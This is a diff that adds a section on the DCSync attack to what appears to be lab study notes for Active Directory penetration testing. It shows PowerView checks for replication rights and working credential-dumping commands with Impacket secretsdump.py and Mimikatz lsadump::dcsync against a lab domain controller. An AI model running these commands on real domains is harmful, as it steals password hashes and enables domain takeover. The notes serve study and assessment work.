@@ -2040,3 +2040,113 @@ This document outlines a step-by-step attack chain to escalate privileges in an 
 - **Proactive Monitoring:** Regular auditing and monitoring are essential to prevent ACL abuse.
 - **Comprehensive Cleanup:** Document all changes during assessments and ensure no residual changes remain.
 
+---
+
+# DCSync 
+
+## **What is DCSync?**
+- **DCSync** is an attack technique to extract password hashes and other secrets from Active Directory (AD).
+- Leverages the **Directory Replication Service Remote Protocol** (DRSR) to request replication of AD secrets (e.g., NTLM hashes, Kerberos keys).
+- **Required Permissions**: 
+  - **Replicating Directory Changes**
+  - **Replicating Directory Changes All**
+- **Typical Privileged Accounts**:
+  - Domain Admins
+  - Enterprise Admins
+  - Delegated accounts with DCSync rights.
+
+
+
+## **Core Mechanics**
+1. **Protocol Misuse**:
+   - Exploits the replication process where Domain Controllers (DCs) share data for synchronization.
+2. **Outcome**:
+   - Steals NTLM hashes, Kerberos keys, and optionally cleartext passwords if reversible encryption is enabled.
+
+
+## **Detecting DCSync Rights**
+
+### **Step 1: Verify Group Membership**
+- Check if the user (`adunn`) belongs to privileged groups:
+  ```powershell
+  Get-DomainUser -Identity adunn | select samaccountname, objectsid, memberof, useraccountcontrol | fl
+  ```
+- Example output:
+  - Normal account with additional permissions:
+    - `DONT_EXPIRE_PASSWORD`
+    - Membership in security groups with extended rights.
+
+### **Step 2: Check ACLs for Replication Rights**
+- Extract user's **Security Identifier (SID)**:
+  ```powershell
+  $sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
+  ```
+- Use `Get-ObjectAcl` to verify replication permissions:
+  ```powershell
+  Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') } | ?{ $_.SecurityIdentifier -match $sid }
+  ```
+- Example output includes:
+  - `DS-Replication-Get-Changes`
+  - `DS-Replication-Get-Changes-All`
+
+
+
+## **Performing DCSync Attacks**
+
+### **Using Impacket (Linux Host)**
+1. **Run secretsdump.py**:
+   ```bash
+   secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+   ```
+2. **Options**:
+   - `-just-dc`: Extract NTLM hashes and Kerberos keys.
+   - `-just-dc-user <USERNAME>`: Extract for a specific user.
+   - `-history`: Dump password history.
+   - `-pwd-last-set`: Check password last change timestamps.
+
+3. **Output Files**:
+   - `.ntds`: NTLM hashes.
+   - `.ntds.kerberos`: Kerberos keys.
+   - `.ntds.cleartext`: Cleartext passwords (if reversible encryption enabled).
+
+
+
+### **Using Mimikatz (Windows Host)**
+
+#### **Step 1: Run PowerShell as the DCSync Privileged User**
+1. Use the **runas.exe** command to start a session as the user with DCSync privileges:
+   ```cmd
+   runas /netonly /user:INLANEFREIGHT\adunn powershell
+   ```
+2. Enter the password for `INLANEFREIGHT\adunn` when prompted.
+
+#### **Step 2: Perform the Attack in the New Session**
+1. Launch Mimikatz:
+   ```powershell
+   .\mimikatz.exe
+   ```
+2. Elevate privileges in Mimikatz:
+   ```mimikatz
+   privilege::debug
+   ```
+3. Execute the DCSync attack:
+   ```mimikatz
+   lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+   ```
+4. **Example Output**:
+   - NTLM Hash: `88ad09182de639ccc6579eb0849751cf`
+   - Supplemental credentials like Kerberos keys.
+
+
+
+## **Special Cases: Reversible Encryption**
+- **Reversible encryption** stores passwords in RC4-encrypted form.
+- Accounts with reversible encryption enabled can be enumerated:
+  ```powershell
+  Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+  ```
+- Example Account:
+  - `proxyagent` with `ENCRYPTED_TEXT_PWD_ALLOWED`.
+- The password can be decrypted using tools like `secretsdump.py`.
+
+---
